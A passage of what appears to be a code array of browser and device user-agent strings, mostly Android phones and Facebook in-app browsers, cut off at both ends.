Gecko) Chrome/48.0.2564.82 Mobile Safari/537.36 Tepi/14.14332','Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; WebBrowser/8.1; IEMobile/11.0; NOKIA; Lumia 525) like Gecko UCBrowser/4.2.1.541 Mobile','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nokia; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10570','Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0','Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/307.0.0.40.111;]','Mozilla/5.0 (Linux; U; Android 4.1.3; ru-RU; Nokia_X Build/GRK39F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF]','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 6.0; Redmi 4 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Tizen 2.2; SAMSUNG SM-Z9005) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.2 like Android 4.1; Mobile Safari/537.3','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.13014 YaBrowser/13.12.1599.13014 Safari/537.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.5.6','Mozilla/5.0 (Linux; Android 8.1.0; BBF100-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FB_IAB/FB4A;FBAV/127.0.0.22.69','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3638; U; en) Presto/2.8.119 Version/11.10','SAMSUNG-GT-C3312R Opera/9.80 (J2ME/MIDP; Opera Mini/7.0.32584/144.30; U; en) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-I8200N Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-P5110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30','Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414','Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)','Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/159.0.0.38.95;]','Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36[FB_IAB/FB4A;FBAV/311.0.0.44.117;]','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019)[FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Xperia Z3 Tablet Compact LTE Build/OPM8.190305.001; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.0(20416) Chrome/76.0.3809.111 Safari/537.36','Mozilla/5.0 (Linux; Android 10; Xperia Z3 Compact) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692','Mozilla/5.0 (Linux; Android 9; Xperia Z3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/286.0.0.48.112;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/290.0.0.44.121;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 KHTML, like Gecko) Chrome/80.0.3987.122 Mobile Safari/537.','Mozilla/5.0 (Linux; Android 8.0.0; Nokia 3.1 Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/12.9.10.1166 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; SM-T295 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (Linux; Android 11; SM-A715F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.164 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148[FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]','Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]','Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Huawei; H883G; HuaweiH883G)','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.29 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 CoolBrowser/33.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.1; ru-RU; SM-S920L Build/KOT49E) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 5.1.1; SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Mobile','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]','Mozilla/5.0 (Linux; Android 9; LT-NOTE 10S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36 UCBrowser/11.4.1.1138 (UCMini) Mobile','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF','Mozilla/5.0 (Linux; Android 9; Star) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45','Mozilla/5.0 (Series40; NokiaC2-02/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27','Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone  OS 7.5; Trident/5.0; IEMobile/9.0','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/E7FBAF','Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1','Nokia5800/20.0.002 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413','Mozilla/5.0 (Linux; Android 10; CDY-NX9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; EVR-L29 Build/HUAWEIEVR-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; LYA-AL00 Build/HUAWEILYA-AL00) 